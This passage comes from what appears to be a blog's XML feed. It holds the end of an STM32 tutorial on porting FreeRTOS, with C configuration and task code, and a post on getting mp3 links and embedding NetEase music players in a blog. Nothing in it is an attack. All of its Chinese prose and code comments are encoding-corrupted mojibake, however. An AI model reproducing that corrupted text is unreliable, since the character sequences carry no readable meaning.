  RCC_PCLK2Config(RCC_HCLK_Div1);
  //å¤–éƒ¨æ—¶é’Ÿä¸º8M è¿™é‡Œå€é¢‘åˆ°72M
  RCC_PLLConfig(RCC_PLLSource_HSE_Div1, RCC_PLLMul_9);
  RCC_PLLCmd(ENABLE);
  while(RCC_GetFlagStatus(RCC_FLAG_PLLRDY) == RESET);
  RCC_SYSCLKConfig(RCC_SYSCLKSource_PLLCLK);
  while(RCC_GetSYSCLKSource() != 0x08);

  //----------------------------- CLOSE HSI ---------------------------
  //å…³é—­å†…éƒ¨æ—¶é’ŸHSI
  RCC_HSICmd(DISABLE);

  //ä¸­æ–­é…ç½® 2-level interrupt
  NVIC_PriorityGroupConfig(NVIC_PriorityGroup_2);

  //å¼€æ€»ä¸­æ–­
  __enable_irq();
  /******************   OPEN GPIO CLK   **************/
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE);
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOC, ENABLE);
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_AFIO, ENABLE);
}
</code></pre>
<p>main.h</p>
<pre><code class="C">#ifndef MAIN_H
#define MAIN_H

#include &quot;stm32f10x.h&quot;
#include &quot;delay.h&quot;
#include &quot;usart.h&quot;
#include &quot;led.h&quot;

#endif  /* MAIN_H */
</code></pre>
<p>è‡³æ­¤ï¼Œç³»ç»Ÿæ—¶é’ŸåŠå¤–è®¾çš„åˆå§‹åŒ–ç¨‹åºå·²ç»å®Œæˆã€‚ä»¥ä¸Šç¨‹åºï¼Œé™¤å» led.c/led.h, usart.c/usart.h å¤–ï¼Œå¯ä½œä¸ºæ— éœ€æ“ä½œç³»ç»Ÿçš„stm32é¡¹ç›®æ¨¡æ¿ã€‚</p>
<h3 id="å†…æ ¸ç§»æ¤"><a href="#å†…æ ¸ç§»æ¤" class="headerlink" title="å†…æ ¸ç§»æ¤"></a>å†…æ ¸ç§»æ¤</h3><ul>
<li>æ–°å»ºç»„<ul>
<li>åœ¨é¡¹ç›®ä¸­æ·»åŠ ä¸€ä¸ªç»„ï¼Œå‘½åä¸º <strong>FreeRTOS</strong> ï¼›</li>
<li>åœ¨æœ¬åœ°ç›®å½•æ–°å»ºæ–‡ä»¶å¤¹ï¼ŒåŒæ ·å‘½åä¸º FreeRTOS ï¼Œç”¨äºå­˜æ”¾ç³»ç»Ÿå†…æ ¸çš„æºæ–‡ä»¶ï¼›</li>
<li>åœ¨ FreeRTOS æ–‡ä»¶å¤¹ä¸‹æ–°å»ºå­æ–‡ä»¶å¤¹ include ï¼Œç”¨äºå­˜æ”¾ç³»ç»Ÿå†…æ ¸çš„å¤´æ–‡ä»¶ã€‚</li>
</ul>
</li>
<li>å¤åˆ¶æ–‡ä»¶<ul>
<li>ä»ç³»ç»Ÿ FreeRTOSv9.0.0 çš„æºç  <code>FreeRTOS\Source</code> ä¸­æ‰¾åˆ°ä»¥ä¸‹æºæ–‡ä»¶ï¼Œå¹¶å°†å…¶å¤åˆ¶è‡³ FreeRTOS æ–‡ä»¶å¤¹ï¼›<ul>
<li><code>Source</code> ä¸­çš„ <strong>list.c</strong>, <strong>queue.c</strong>, <strong>tasks.c</strong></li>
<li><code>Source\portable\RVDS\ARM_CM3</code> ä¸­çš„ <strong>port.c</strong></li>
<li><code>Source\portable\MemMang</code> ä¸­çš„ <strong>heap_2.c</strong></li>
</ul>
</li>
<li>ä»ç³»ç»Ÿ FreeRTOSv9.0.0 çš„æºç  <code>FreeRTOS</code> ä¸­æ‰¾åˆ°ä»¥ä¸‹å¤´æ–‡ä»¶ï¼Œå¹¶å°†å…¶å¤åˆ¶è‡³ FreeRTOS/include æ–‡ä»¶å¤¹ï¼›<ul>
<li><code>Source\include</code> ä¸­çš„æ‰€æœ‰å¤´æ–‡ä»¶ï¼ŒåŒ…æ‹¬å…¶ä¸­çš„ stdint.readme æ–‡ä»¶</li>
<li><code>Source\portable\RVDS\ARM_CM3</code> ä¸­çš„ <strong>portmacro.h</strong></li>
<li><code>Demo\CORTEX_STM32F103_Keil</code> ä¸­çš„ <strong>FreeRTOSConfig.h</strong></li>
</ul>
</li>
<li>åœ¨é¡¹ç›®ç»„ FreeRTOS ä¸­æ·»åŠ ä»¥ä¸Šå·²å¤åˆ¶å¥½çš„æºæ–‡ä»¶</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>è¯´æ˜</strong>ï¼šFreeRTOSå¯ä»¥åœ¨å¾ˆå¤šä¸åŒç¼–è¯‘å™¨ä¸­ç¼–è¯‘ï¼Œå…¶ä¸­çš„ä¸€äº›ç¼–è¯‘å™¨æ¯”åŒç±»æœ‰æ›´é«˜çº§ç‰¹æ€§ã€‚å› ä¸ºè¿™ä¸ªåŸå› ï¼ŒFreeRTOSä¸ä½¿ç”¨ä»»ä½•éCè¯­è¨€æ ‡å‡†çš„ç‰¹æ€§æˆ–è¯­æ³•ã€‚ä¸€ä¸ªä¾‹å¤–æƒ…å†µæ˜¯å¤´æ–‡ä»¶stdint.hã€‚åœ¨æ–‡ä»¶å¤¹FreeRTOS/Source/includeä¸‹åŒ…å«ä¸€ä¸ªå«åšstdint.readmeçš„æ–‡ä»¶ï¼Œå¦‚æœä½ çš„ç¼–è¯‘å™¨ä¸æä¾›stdintç±»å‹å®šä¹‰ï¼Œå¯ä»¥å°†stdint.readmeæ–‡ä»¶é‡å‘½åä¸ºstdint.hã€‚</p>
</blockquote>
<p>å‚è€ƒï¼š<a href="http://blog.csdn.net/zhzht19861011/article/details/50057531" target="_blank" rel="noopener">FreeRTOSç¼–ç æ ‡å‡†åŠé£æ ¼æŒ‡å—</a></p>
<p>å®Œæˆä»¥ä¸Šæ­¥éª¤åï¼Œæ–‡ä»¶ç»“æ„åº”è¯¥å¦‚ä¸‹å„å›¾æ‰€ç¤ºï¼š<br>File - FreeRTOS</p>
<p><img src="/assets/stm32/folderfreeRTOS.png" alt="æœ¬åœ°æ–‡ä»¶ä¸­çš„FreeRTOSæ–‡ä»¶å¤¹"></p>
<p>File - FreeRTOS\include</p>
<p><img src="/assets/stm32/folderfreeRTOSInclude.png" alt="æœ¬åœ°æ–‡ä»¶ä¸­çš„includeæ–‡ä»¶å¤¹"></p>
<p>MDK - FreeRTOS</p>
<p><img src="/assets/stm32/groupfreeRTOS.png" alt="MDKä¸­çš„FreeRTOSç»„"></p>
<ul>
<li>æ·»åŠ è·¯å¾„</li>
</ul>
<p>å†æ¬¡æ‰“å¼€ <code>Options for target</code>&gt;&gt;<code>C/C++</code>ï¼Œåœ¨ Include Paths ä¸­æ·»åŠ :</p>
<ol>
<li>.\USER</li>
<li>.\FreeRTOS</li>
<li>.\FreeRTOS\include</li>
</ol>
<p><img src="/assets/stm32/addPath.png" alt="æ·»åŠ è·¯å¾„"></p>
<ul>
<li>ä¿®æ”¹å¯åŠ¨æ–‡ä»¶</li>
</ul>
<p>æ‰“å¼€æ–‡ä»¶ &quot;startup_stm32f10x_md.s&quot;ï¼Œåœ¨ 50 è¡Œé™„è¿‘æ‰¾åˆ°ä»¥ä¸‹ä»£ç æ®µï¼š</p>
<p>æ–‡ä»¶ä¿®æ”¹å‰</p>
<p><img src="/assets/stm32/beforeAddExport.png" alt="æ·»åŠ Exportä¹‹å‰çš„å¯åŠ¨æ–‡ä»¶"></p>
<p>ä¿®æ”¹æ–¹å¼å¦‚ä¸‹ï¼š</p>
<p>åœ¨ &quot;__heap_limit&quot;åæ·»åŠ ï¼š</p>
<pre><code class="yml">IMPORT xPortPendSVHandler
IMPORT xPortSysTickHandler
IMPORT vPortSVCHandler
</code></pre>
<p>å°† 75 è¡Œå·¦å³çš„</p>
<pre><code class="yml">DCD     SVC_Handler
DCD     PendSV_Handler
DCD     SysTick_Handler
</code></pre>
<p>ä¾æ¬¡ä¿®æ”¹ä¸ºï¼š</p>
<pre><code class="yml">DCD     vPortSVCHandler
DCD     xPortPendSVHandler
DCD     xPortSysTickHandler
</code></pre>
<p>æ–‡ä»¶ä¿®æ”¹å</p>
<p><img src="/assets/stm32/afterAddExport.png" alt="æ·»åŠ Exportä¹‹å‰çš„å¯åŠ¨æ–‡ä»¶"></p>
<h3 id="å†…æ ¸è£å‰ªæ–‡ä»¶"><a href="#å†…æ ¸è£å‰ªæ–‡ä»¶" class="headerlink" title="å†…æ ¸è£å‰ªæ–‡ä»¶"></a>å†…æ ¸è£å‰ªæ–‡ä»¶</h3><p>å‰é¢æ·»åŠ çš„å¤´æ–‡ä»¶ &quot;FreeRTOSConfig.h&quot; æ˜¯ç³»ç»Ÿå†…æ ¸é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ä¿®æ”¹æ–‡ä»¶ä¸­çš„å®å®šä¹‰ï¼Œå¯ä»¥å¯¹å†…æ ¸è¿›è¡Œè£å‰ªï¼Œä¿ç•™æ‰€éœ€åŠŸèƒ½ã€‚ä»ä¾‹ç¨‹ä¸­å¾—åˆ°çš„è¯¥æ–‡ä»¶æºç å¦‚ä¸‹ï¼Œæ›´åŠ è¯¦ç»†çš„è®¾ç½®æ–¹æ³•å’Œå„å˜é‡ç”¨é€”å°†åœ¨åç»­åº”ç”¨ä¸­ä»‹ç»ã€‚</p>
<pre><code class="C">#ifndef FREERTOS_CONFIG_H
#define FREERTOS_CONFIG_H

/*-----------------------------------------------------------
 * Application specific definitions.
 *
 * These definitions should be adjusted for your particular hardware and
 * application requirements.
 *
 * THESE PARAMETERS ARE DESCRIBED WITHIN THE &#39;CONFIGURATION&#39; SECTION OF THE
 * FreeRTOS API DOCUMENTATION AVAILABLE ON THE FreeRTOS.org WEB SITE.
 *
 * See http://www.freertos.org/a00110.html.
 *----------------------------------------------------------*/

#define configUSE_PREEMPTION    1
#define configUSE_IDLE_HOOK      0
#define configUSE_TICK_HOOK      0
#define configCPU_CLOCK_HZ      ( ( unsigned long ) 72000000 )
#define configTICK_RATE_HZ      ( ( TickType_t ) 1000 )
#define configMAX_PRIORITIES    ( 5 )
#define configMINIMAL_STACK_SIZE  ( ( unsigned short ) 128 )
#define configTOTAL_HEAP_SIZE    ( ( size_t ) ( 17 * 1024 ) )
#define configMAX_TASK_NAME_LEN    ( 16 )
#define configUSE_TRACE_FACILITY  0
#define configUSE_16_BIT_TICKS    0
#define configIDLE_SHOULD_YIELD    1

/* Co-routine definitions. */
#define configUSE_CO_ROUTINES     0
#define configMAX_CO_ROUTINE_PRIORITIES ( 2 )

/* Set the following definitions to 1 to include the API function, or zero
to exclude the API function. */

#define INCLUDE_vTaskPrioritySet    1
#define INCLUDE_uxTaskPriorityGet    1
#define INCLUDE_vTaskDelete        1
#define INCLUDE_vTaskCleanUpResources  0
#define INCLUDE_vTaskSuspend      1
#define INCLUDE_vTaskDelayUntil      1
#define INCLUDE_vTaskDelay        1

/* This is the raw value as per the Cortex-M3 NVIC.  Values can be 255
(lowest) to 0 (1?) (highest). */
#define configKERNEL_INTERRUPT_PRIORITY     255
/* !!!! configMAX_SYSCALL_INTERRUPT_PRIORITY must not be set to zero !!!!
See http://www.FreeRTOS.org/RTOS-Cortex-M3-M4.html. */
#define configMAX_SYSCALL_INTERRUPT_PRIORITY   191 /* equivalent to 0xb0, or priority 11. */


/* This is the value being used as per the ST library which permits 16
priority values, 0 to 15.  This must correspond to the
configKERNEL_INTERRUPT_PRIORITY setting.  Here 15 corresponds to the lowest
NVIC value of 255. */
#define configLIBRARY_KERNEL_INTERRUPT_PRIORITY  15

#endif /* FREERTOS_CONFIG_H */
</code></pre>
<h3 id="åŠŸèƒ½å®ç°"><a href="#åŠŸèƒ½å®ç°" class="headerlink" title="åŠŸèƒ½å®ç°"></a>åŠŸèƒ½å®ç°</h3><p>ç»è¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œç³»ç»Ÿç§»æ¤å·¥ä½œå·²ç»å®Œæˆï¼Œç°åœ¨ä¾¿å¯ä»¥åˆ›å»ºå¤šä¸ªä»»åŠ¡ï¼Œå¹¶å¯åŠ¨ä»»åŠ¡è°ƒåº¦å™¨è¿›è¡Œä»»åŠ¡è°ƒåº¦ã€‚</p>
<ul>
<li>åœ¨ &quot;main.h&quot; æ·»åŠ  FreeRTOS ç›¸å…³çš„å¤´æ–‡ä»¶</li>
</ul>
<pre><code class="txt">#include &quot;FreeRTOS.h&quot;
#include &quot;task.h&quot;
#include &quot;queue.h&quot;
#include &quot;list.h&quot;
</code></pre>
<ul>
<li>ç¼–å†™ä»»åŠ¡</li>
</ul>
<pre><code class="C">// å®šæ—¶äº®ç¯ä»»åŠ¡
static void vLEDOnTask(void *pvParameters)
{
  TickType_t xLastWakeTime;
  const TickType_t xFrequency = 1000/portTICK_RATE_MS;

  /* xLastWakeTimeéœ€è¦è¢«åˆå§‹åŒ–ä¸ºå½“å‰å¿ƒè·³è®¡æ•°å€¼ï¼Œæ­¤æ¬¡èµ‹å€¼è¿‡åï¼Œ
  è¯¥å˜é‡å°†åœ¨vTaskDelayUntilå‡½æ•°ä¸­è‡ªåŠ¨æ›´æ–° */
  xLastWakeTime = xTaskGetTickCount();

  while(1)
  {
    GPIO_ResetBits(GPIOB,LED_PORT);
    UARTSendByByter(&#39;1&#39;);

    vTaskDelayUntil(&amp;xLastWakeTime,xFrequency);
  }
}

// å®šæ—¶ç­ç¯ä»»åŠ¡
static void vLEDOffTask(void *pvParameters)
{
  while(1)
  {
        GPIO_SetBits(GPIOB,LED_PORT);
    UARTSendByByter(&#39;2&#39;);

      vTaskDelay(2000/portTICK_RATE_MS);
  }
}

// å®šæ—¶ä¸²å£å‘é€ä»»åŠ¡
static void vUasrtSendTask(void *pvParameters)
{
  volatile unsigned char cnt=0;
  TaskHandle_t xTaskLedOffHandle = (TaskHandle_t)pvParameters;

  while(1)
  {
    UARTSendByByter(cnt++);
    if(xTaskLedOffHandle!=NULL)
    {
      if(cnt==50)
        vTaskSuspend(xTaskLedOffHandle);    // æŒ‚èµ·ç­ç¯ä»»åŠ¡
      else if(cnt==100)
        vTaskResume(xTaskLedOffHandle);    // å”¤é†’ç­ç¯ä»»åŠ¡
      else if(cnt==255)
      {
        vTaskDelete(xTaskLedOffHandle);    // åˆ é™¤ç­ç¯ä»»åŠ¡
        xTaskLedOffHandle=NULL;
      }
    }
    vTaskDelay(1500/portTICK_RATE_MS);
  }
}
</code></pre>
<ul>
<li>åˆ›å»ºä»»åŠ¡å¹¶å¯åŠ¨è°ƒåº¦å™¨</li>
</ul>
<pre><code class="C">int main(void)
{
  TaskHandle_t xTaskLedOffHandle;    /* å®šä¹‰ç­ç¯ä»»åŠ¡å¥æŸ„ */
  prvSetupHardware();            /* è®¾å¤‡åˆå§‹åŒ– */

  xTaskCreate(vLEDOffTask,           /* æŒ‡å‘ä»»åŠ¡å‡½æ•°çš„æŒ‡é’ˆ */
      &quot;vLEDOffTask&quot;,           /* ä»»åŠ¡çš„æ–‡æœ¬åå­—ï¼Œåªåœ¨è°ƒè¯•ä¸­ç”¨åˆ° */
      configMINIMAL_STACK_SIZE,   /* åˆ†é…çš„æ ˆç©ºé—´å¤§å° */
      NULL,                 /* æ²¡æœ‰ç»™å½“å‰ä»»åŠ¡æä¾›å‚æ•° */
      tskIDLE_PRIORITY+1,        /* è®¾ç½®ä»»åŠ¡ä¼˜å…ˆçº§ */
      &amp;xTaskLedOffHandle        /* è·å–ä»»åŠ¡å¥æŸ„ï¼Œå­˜å…¥xTaskLedOffHandle */
      );
  xTaskCreate(vLEDOnTask, &quot;vLEDOnTask&quot;, configMINIMAL_STACK_SIZE, NULL, tskIDLE_PRIORITY+2, NULL);
  xTaskCreate(vUasrtSendTask, &quot;vUasrtSendTask&quot;, configMINIMAL_STACK_SIZE,
              (TaskHandle_t)(xTaskLedOffHandle), tskIDLE_PRIORITY+3, NULL);

  /* å¯åŠ¨ä»»åŠ¡è°ƒåº¦å™¨ */
  vTaskStartScheduler();

  return 0;
}
</code></pre>
<ul>
<li>åŠŸèƒ½æµ‹è¯•</li>
</ul>
<p><img src="/assets/stm32/tasksTest.png" alt="ä»»åŠ¡æµ‹è¯•ç»“æœ"></p>
<p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œ16 è¿›åˆ¶æ•°æ® 0x31, 0x32 äº¤æ›¿å‡ºç°ï¼ŒåŒæ—¶æœ‰ä¸€å˜é‡(å‡è®¾ä¸º y )ä» 0x01 é€ä¸€å¢è‡³ 0xff åè¿”å› 0x01 ç»§ç»­å¢åŠ ï¼Œåœ¨ y å¤„äº 0x32(50) ä¸ 0x64(100) ä¹‹é—´æ—¶ï¼Œ0x32 æš‚åœå‡ºç°ï¼Œåé‡æ–°å‡ºç°ï¼Œç›´åˆ° y å¢è‡³ 0xff åæ°¸ä¸å†ç°ã€‚æ­¤å¤–ï¼Œç¡¬ä»¶éƒ¨åˆ†ï¼ŒPB10 å¤–æ¥çš„ LED ä¹Ÿéšç€ä»»åŠ¡è¿›è¡Œäº®ç­äº¤æ›¿å˜æ¢ï¼Œæœ€åä¿æŒåœ¨ç¯äº®çŠ¶æ€ã€‚</p>
<p><img src="/assets/stm32/ledOn.jpg" alt="LedOn"><br><img src="/assets/stm32/ledOff.jpg" alt="LedOff"></p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> FreeRTOS </tag>
            
            <tag> stm32 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[åœ¨åšå®¢ä¸­æ·»åŠ éŸ³ä¹]]></title>
      <url>https://www.litreily.top/2016/10/28/add-Music/</url>
      <content type="html"><![CDATA[<h2 id="éŸ³ä¹æ¥æº"><a href="#éŸ³ä¹æ¥æº" class="headerlink" title="éŸ³ä¹æ¥æº"></a>éŸ³ä¹æ¥æº</h2><p>ç°åœ¨è¦æ‰¾ä¸ª <code>.mp3</code> å¤–é“¾èµ„æºå¯çœŸä¸å®¹æ˜“ï¼Œä»¥å¾€çš„é…·ç‹—æ­Œæ›²ä¿¡æ¯é‡Œå¸¦ç€ï¼Œç°åœ¨ä¹Ÿä¸è§äº†ï¼Œç™¾åº¦éŸ³ä¹ä¸‹è½½ä¹Ÿå¾—ç”¨å®¢æˆ·ç«¯ï¼Œè¿˜ä¸æ˜¾ç¤ºé“¾æ¥ï¼Œå„å¤§éŸ³ä¹ç½‘ç«™çœŸæ˜¯è¶Šæ¥è¶Šå°å¿ƒäº†å•Šã€‚</p>
<h3 id="ç½‘æ˜“äº‘éŸ³ä¹"><a href="#ç½‘æ˜“äº‘éŸ³ä¹" class="headerlink" title="ç½‘æ˜“äº‘éŸ³ä¹"></a>ç½‘æ˜“äº‘éŸ³ä¹</h3><p>æƒ³è¦ä»ç½‘ç«™è·å–éŸ³ä¹é“¾æ¥çš„æ–¹æ³•è¿˜æ˜¯æœ‰çš„ï¼Œæ¯”å¦‚è¯´  <a href="http://music.163.com/#" target="_blank" rel="noopener">ç½‘æ˜“äº‘éŸ³ä¹</a>  ã€‚ä½¿ç”¨Google/firefox/edgeç­‰å¸¦å¼€å‘è€…å·¥å…·çš„æµè§ˆå™¨æ‰“å¼€ç½‘æ˜“äº‘éŸ³ä¹ï¼Œæœç´¢è‡ªå·±æƒ³è¦çš„éŸ³ä¹ï¼Œå¹¶è¿›è¡Œæ’­æ”¾ï¼Œç„¶åæ‰“å¼€å¼€å‘è€…å·¥å…·ã€‚å¼€å‘å·¥å…·æ‰“å¼€æ–¹å¼ï¼š</p>
<ol>
<li>è°·æ­Œï¼šå³é”®ç‚¹å‡»  <strong>æ£€æŸ¥</strong>ï¼Œæˆ–ä½¿ç”¨å¿«æ·é”® <code>Ctrl+Shift+I</code> ;</li>
<li>edgeï¼šå³é”®ç‚¹å‡» <strong>æ£€æŸ¥å…ƒç´ </strong>/ <strong>æŸ¥çœ‹æº</strong>ï¼Œæˆ–ä½¿ç”¨å¿«æ·é”® <code>F12</code> ;</li>
<li>firefoxï¼šå¿«æ·é”® <code>Shift+F2</code> ã€‚</li>
</ol>
<p><img src="/assets/music/xishanyao.png" alt="ç½‘æ˜“äº‘éŸ³ä¹"></p>
<p>ä»¥  <a href="http://music.163.com/#/song?id=405253647" target="_blank" rel="noopener">å¤•å±±è°£</a>  ä¸ºä¾‹ï¼Œæ‰“å¼€å¼€å‘å·¥å…·ï¼Œæ‰¾åˆ°  <code>Application</code> ï¼Œæ‰“å¼€ <code>Frames/top/Media</code> ã€‚</p>
<p><img src="/assets/music/xishanyaoLink.png" alt="å¼€å‘å·¥å…·"></p>
<p>å³é”®é€‰æ‹©&quot; Open link in new tab &quot; æˆ–è€… &quot; Copy link address &quot;ï¼Œé€‰å–é“¾æ¥çš„å‰åŠéƒ¨åˆ†,ä»¥ <code>.mp3</code> ç»“å°¾ã€‚å¾—åˆ°é“¾æ¥ï¼š</p>
<pre><code class="yml">å¤•å±±è°£
http://m10.music.126.net/20161028204714/808f68e0d3afc7d68d6945d0ce8336eb/ymusic/5a20/163f/3437/9a6871479b12bc82fff53821676faedc.mp3
</code></pre>
<h3 id="æœ¬åœ°ä¸Šä¼ "><a href="#æœ¬åœ°ä¸Šä¼ " class="headerlink" title="æœ¬åœ°ä¸Šä¼ "></a>æœ¬åœ°ä¸Šä¼ </h3><p>é™¤äº†ä¸Šè¿°æ–¹æ³•å¤–ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨åˆ¶ä½œéŸ³ä¹å¤–é“¾ï¼Œå½“ç„¶ï¼Œè¿™éœ€è¦å€ŸåŠ©äºå…¶å®ƒç½‘ç«™ï¼Œæ¯”å¦‚  <a href="http://www.111ttt.com/up/" target="_blank" rel="noopener">www.111ttt.com/up/</a>  ã€‚åœ¨è¯¥ç½‘ç«™ä¸Šä¼ å·²ç»ä¸‹å¥½çš„éŸ³ä¹æ–‡ä»¶ï¼Œç„¶åç‚¹å‡»æ’­æ”¾åœ°å€ï¼Œåœ¨å¼¹å‡ºçš„é¡µé¢åº•éƒ¨å°±æœ‰å·²ç”Ÿæˆçš„å¤–é“¾åœ°å€äº†ã€‚</p>
<p><img src="/assets/music/upFile.png" alt="ä¸Šä¼ éŸ³ä¹"></p>
<pre><code class="yml">Critty æèŠ±å¼¦å¤–é›¨
http://sc.111ttt.com/up/mp3/193721/278DF18856D56FEC6B4E6EDC15D97906.mp3
</code></pre>
<h3 id="ä¸ƒç‰›äº‘å­˜å‚¨"><a href="#ä¸ƒç‰›äº‘å­˜å‚¨" class="headerlink" title="ä¸ƒç‰›äº‘å­˜å‚¨"></a>ä¸ƒç‰›äº‘å­˜å‚¨</h3><p><a href="http://www.qiniu.com/" target="_blank" rel="noopener">ä¸ƒç‰›äº‘</a> ä½œä¸ºå›½å†…é¢†å…ˆçš„ä¼ä¸šçº§äº‘æœåŠ¡å•†ï¼Œå½“ç„¶æä¾›äº†æœ€åŸºæœ¬çš„äº‘å­˜å‚¨æœåŠ¡ã€‚å½“å‰å¯ä»¥å…è´¹æ³¨å†Œå¹¶è¿›è¡Œå®åè®¤è¯ï¼Œä¹‹åå¯ä»¥è·å– 10GB çš„å…è´¹å­˜å‚¨ç©ºé—´ã€‚</p>
<p><img src="/assets/music/qiniuyunSpace.png" alt="ä¸ƒç‰›äº‘å…è´¹ç©ºé—´"></p>
<p>æ³¨å†Œå¹¶ç™»å½•åï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªç©ºé—´ï¼Œå¦‚ <code>litreily</code>ï¼Œç„¶åæ‰“å¼€ <code>å¯¹è±¡å­˜å‚¨</code> &gt;&gt; <code>litreily</code> &gt;&gt; <code>å†…å®¹ç®¡ç†</code>ã€‚æ­¤æ—¶ä¾¿å¯ä¸Šä¼ æ–‡ä»¶ï¼Œæ–‡ä»¶ç±»å‹ä¸é™ï¼Œæˆ‘ä»¬å¯ä»¥å°†æœ¬åœ°éŸ³ä¹æ–‡ä»¶ä¸Šä¼ åè·å–å…¶å¤–é“¾åœ°å€ã€‚</p>
<p><img src="/assets/music/qiniuyunLink.png" alt="ä¸ƒç‰›äº‘å¤–é“¾è·å–æ–¹æ³•"></p>
<p>æ‰€å¾—å¤–é“¾åœ°å€ä¸ºï¼š</p>
<pre><code class="yml">CRITTY - è½®å›ä¹‹å¢ƒ
http://ofx35z92m.bkt.clouddn.com/CRITTY%20-%20%E8%BD%AE%E5%9B%9E%E4%B9%8B%E5%A2%83.mp3
</code></pre>
<audio class="musicPlayer" src="http://ofx35z92m.bkt.clouddn.com/CRITTY%20-%20%E8%BD%AE%E5%9B%9E%E4%B9%8B%E5%A2%83.mp3" autoplay></audio>

<h2 id="éŸ³ä¹æ’­æ”¾å™¨"><a href="#éŸ³ä¹æ’­æ”¾å™¨" class="headerlink" title="éŸ³ä¹æ’­æ”¾å™¨"></a>éŸ³ä¹æ’­æ”¾å™¨</h2><h3 id="ç½‘æ˜“äº‘éŸ³ä¹æ’ä»¶"><a href="#ç½‘æ˜“äº‘éŸ³ä¹æ’ä»¶" class="headerlink" title="ç½‘æ˜“äº‘éŸ³ä¹æ’ä»¶"></a>ç½‘æ˜“äº‘éŸ³ä¹æ’ä»¶</h3><p>ç½‘æ˜“äº‘éŸ³ä¹æä¾›äº†å¤–é“¾æ’­æ”¾å™¨ï¼Œå®˜æ–¹æä¾›çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<ol>
<li>åœ¨ <a href="http://music.163.com/" target="_blank" rel="noopener">music.163.com</a> è¿›å…¥å•æ›²ã€æ­Œå•ã€ä¸“è¾‘ã€ç”µå°èŠ‚ç›®é¡µé¢åï¼Œç‚¹å‡» â€œç”Ÿæˆå¤–é“¾æ’­æ”¾å™¨â€ é“¾æ¥ã€‚</li>
<li>æ­Œå•å’Œä¸“è¾‘å¤–é“¾æ’­æ”¾å™¨å¯ä»¥é€‰æ‹©å¤§ä¸­å°ä¸‰ç§å°ºå¯¸ï¼Œå•æ›²å’Œç”µå°èŠ‚ç›®å¯ä»¥é€‰æ‹©ä¸­å°ä¸¤ç§å°ºå¯¸ã€‚ä½ å¯ä»¥é€‰æ‹©æœ€é€‚åˆä½ ç½‘ç«™è®¾è®¡çš„å°ºå¯¸ã€‚</li>
<li>è¿˜å¯ä»¥é€‰æ‹©æ˜¯å¦è¦è‡ªåŠ¨æ’­æ”¾ï¼Œæ‰“ä¸Šå‹¾åï¼Œåˆ«äººè®¿é—®ç½‘ç«™æ—¶æ’­æ”¾å™¨ä¼šè‡ªåŠ¨å¼€å§‹æ’­æ”¾ã€‚</li>
<li>æœ€åå°†æ’­æ”¾å™¨çš„ä»£ç é»è´´åˆ°ä½ çš„ç½‘ç«™ä¸Šï¼Œå¤§åŠŸå‘Šæˆï¼</li>
</ol>
<p>[ç¤ºä¾‹ï¼šæèŠ±è½©å¤–é›¨]</p>
<p><img src="/assets/music/wlPlayer.png" alt="ç½‘æ˜“äº‘éŸ³ä¹å¤–é“¾æ’­æ”¾å™¨"></p>
<p>[ç¤ºä¾‹ä»£ç ]</p>
<p><img src="/assets/music/wlDemo.png" alt="ç½‘æ˜“äº‘éŸ³ä¹å¤–é“¾demo"></p>
<p>[ç¤ºä¾‹è¯´æ˜]</p>
<ol>
<li>HTMLæºç ä¸­çš„ &quot; auto=1 &quot; ä»£è¡¨è‡ªåŠ¨æ’­æ”¾ï¼Œæ”¹ä¸º0å³å¯å–æ¶ˆè‡ªåŠ¨æ’­æ”¾åŠŸèƒ½ï¼›</li>
<li>åœ¨markdownæ–‡ä»¶ä¸­å¼•ç”¨è¯¥æ’ä»¶æ—¶ï¼Œéœ€è¦å°† <code>iframe</code> çš„ <code>width</code> å’Œ <code>height</code> å±æ€§å€¼ç”¨åŒå¼•å·åŒ…å›´èµ·æ¥ï¼Œå³ width=&quot;330&quot; height=&quot;86&quot; ,å¦åˆ™å¯èƒ½å‡ºç°æ— æ³•è§£æè¯¥ä»£ç çš„æƒ…å†µï¼›</li>
<li>ä½¿ç”¨æ’ä»¶æ—¶å¯ä»¥æ·»åŠ ä¸€ä¸ªç±»ï¼ˆå¦‚ï¼šclass=&quot;musicPlayer&quot;ï¼‰ï¼Œå‚è€ƒä»¥ä¸‹ä»£ç å¯ä»¥è®¾ç½®æ’­æ”¾å™¨çš„é•¿å®½ã€‚</li>
</ol>
<pre><code class="css">.musicPlayer{
    width: 100%;
    max-width: 500px;
}
</code></pre>
<p>[ç¤ºä¾‹æ’­æ”¾1ï¼šheight=66 auto=1]</p>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="https://music.163.com/outchain/player?type=2&id=32957012&auto=1&height=66"></iframe>

<pre><code class="html">&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot;
height=&quot;86&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32957012&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;
</code></pre>
<p>[ç¤ºä¾‹æ’­æ”¾2ï¼šheight=32 auto=0]</p>
<iframe class="musicPlayer" frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="https://music.163.com/outchain/player?type=2&id=32548265&auto=0&height=32"></iframe>

<pre><code class="html">&lt;iframe class=&quot;musicPlayer&quot; frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;298&quot;
height=&quot;52&quot; src=&quot;https://music.163.com/outchain/player?type=2&amp;id=32548265&amp;auto=0&amp;height=32&quot;&gt;&lt;/iframe&gt;
</code></pre>
